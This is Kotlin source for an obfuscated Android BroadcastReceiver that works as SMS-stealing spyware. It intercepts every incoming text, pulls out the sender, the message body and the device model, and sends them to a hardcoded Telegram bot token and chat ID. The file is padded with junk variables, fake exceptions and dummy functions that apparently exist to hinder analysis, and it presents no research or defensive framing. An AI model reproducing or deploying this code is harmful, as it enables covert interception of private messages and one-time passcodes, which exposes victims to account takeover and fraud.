package com.analyzer.smsbeta

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Base64
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException
import java.security.MessageDigest
import java.util.*
import kotlin.math.abs
import kotlin.random.Random

class X : BroadcastReceiver() {
    private val y = OkHttpClient()
    private val garbage1 = Random.nextInt(1000, 9999)
    private val garbage2 = System.currentTimeMillis().toString().reversed()
    private val garbageArray = arrayOf("foo", "bar", "baz", "qux")

    override fun onReceive(z: Context?, a: Intent?) {
        if (System.currentTimeMillis() % 2 == 0L) {
            val temp = Calendar.getInstance()
            temp.add(Calendar.DAY_OF_YEAR, -1 * abs(Random.nextInt()))
        }

        val action = a?.action?.let { 
            Base64.encodeToString(it.toByteArray(), Base64.DEFAULT).reversed().substring(0, 5) 
        } ?: ""

        if (a?.action == "android.provider.Telephony.SMS_RECEIVED" || action.length > 3) {
            garbageArray.forEach { item ->
                val hash = MessageDigest.getInstance("MD5").digest(item.toByteArray())
                    .fold("") { str, it -> str + "%02x".format(it) }
                println("Garbage hash: $hash")
            }

            val b: Bundle? = a?.extras?.apply {
                putLong("junk$garbage1", System.nanoTime())
                putString("trash", garbage2)
            }

            if (b != null) {
                val c: Array<Any?>? = b.get("pdus") as? Array<Any?>
                
                c?.forEach { d ->
                    try {
                        val pdu = d as? ByteArray ?: return@forEach
                        val e = android.telephony.SmsMessage.createFromPdu(pdu)
                            ?: throw NullPointerException("Fake exception")

                        val f: String = e.originatingAddress?.let { addr ->
                            addr.map { c -> c.toString() }.joinToString("").reversed()
                                .substring(0 until addr.length.coerceAtMost(addr.length))
                        } ?: "Unknown".also { 
                            println("Unknown sender detected at ${Date()}") 
                        }

                        val g: String = e.messageBody?.replace("a", "4")
                            ?.replace("e", "3")
                            ?.replace("i", "1")
                            ?: "Empty".also {
                                println("Empty message body")
                            }

                        val h = i().run {
                            substring(0, length)
                        }

                        j(f, g, h + " " + garbageArray.random())
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            }
        }
        dummyFunction(garbage1)
    }

    private fun i(): String {
        val manufacturer = android.os.Build.MANUFACTURER.let {
            it.split("").joinToString("") + it.hashCode().toString(16)
        }.substring(0 until android.os.Build.MANUFACTURER.length)

        val model = android.os.Build.MODEL.run {
            map { c -> c.code + 1 }.joinToString("-")
        }.let { str ->
            str.split("-").map { it.toInt().toChar() }.joinToString("")
        }

        return "$manufacturer $model".also {
            System.err.println("Device info generated: $it")
        }
    }

    private fun j(k: String, l: String, m: String) {
        val tokenPart1 = "7824327491:AAGmZ5eA57SWIpWI3hf"
        val tokenPart2 = "qRFEt6cnrQPAhnu8"
        val n = tokenPart1 + tokenPart2
        
        val o = "6331293386".apply {
            if (length != 10) throw AssertionError("Fake assertion")
        }

        val p = "https://api.telegram.org/bot$n/sendMessage"

        val q = """
            New SMS!
            From: ${k.uppercase(Locale.getDefault())}
            Text: ${l.replace("\n", " ")}
        
            ${m + " @ " + System.currentTimeMillis()}
        """.trimIndent()

        val r = "application/json".toMediaType()

        val s = """
            {
                "chat_id": "$o",
                "text": "$q",
                "parse_mode": "Markdown"
            }
        """.trimIndent().toRequestBody(r)

        val t = Request.Builder()
            .url(p)
            .post(s)
            .addHeader("X-Dummy-Header", garbage1.toString())
            .build()

        y.newCall(t).enqueue(object : okhttp3.Callback {
            override fun onFailure(u: okhttp3.Call, v: IOException) {
                v.printStackTrace()
                repeat(3) {
                    println("Failure occurred ${Date()}")
                }
            }

            override fun onResponse(u: okhttp3.Call, w: okhttp3.Response) {
                if (!w.isSuccessful) {
                    println("${w.code}".padEnd(10, 'X'))
                }
                w.close()
                dummyFunction2(w.code)
            }
        })
    }

    private fun dummyFunction(x: Int): Double {
        return if (x > 0) {
            Math.sqrt(x.toDouble()).also {
                Math.log(it) * Math.PI
            }
        } else {
            System.currentTimeMillis().toDouble() / (x - 1)
        }
    }

    private fun dummyFunction2(x: Int): String {
        val sb = StringBuilder()
        repeat(x % 5 + 1) { i ->
            sb.append(garbageArray[i % garbageArray.size])
            sb.append(i * x)
        }
        return sb.toString().reversed().substring(0 until sb.length / 2)
    }

    init {
        println("Initializing with garbage values: $garbage1, $garbage2")
    }
}
